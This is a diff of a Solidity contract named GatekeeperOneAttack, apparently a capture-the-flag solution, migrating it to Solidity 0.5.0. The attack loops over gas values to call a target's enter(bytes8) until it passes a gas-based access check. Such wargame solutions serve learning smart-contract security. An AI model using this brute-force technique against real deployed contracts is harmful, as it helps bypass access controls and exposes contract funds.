@@ -1,4 +1,4 @@
-pragma solidity ^0.4.18;
+pragma solidity ^0.5.0;
 
 contract GatekeeperOneAttack {
 
@@ -9,20 +9,19 @@ contract GatekeeperOneAttack {
     // version and optimization settings used to deploy the factory contract.
     // To migitage, brute-force a range of possible values of gas to forward.
     // Using call (vs. an abstract interface) prevents reverts from propagating.
-    bytes memory encodedParams = abi.encodeWithSelector(
-      bytes4(sha3("enter(bytes8)")),
+    bytes memory encodedParams = abi.encodeWithSignature(("enter(bytes8)"),
       key
     );
 
     // gas offset usually comes in around 210, give a buffer of 60 on each side
     for (uint256 i = 0; i < 120; i++) {
-      if (
-        address(GatekeeperOneContractAddress).call.gas(
+      (bool result, bytes memory data) = address(GatekeeperOneContractAddress).call.gas(
           i + 150 + 8191 * 3
         )(
           encodedParams
-        )
-      ) {
+        );
+      if(result)
+        {
         break;
       }
     }
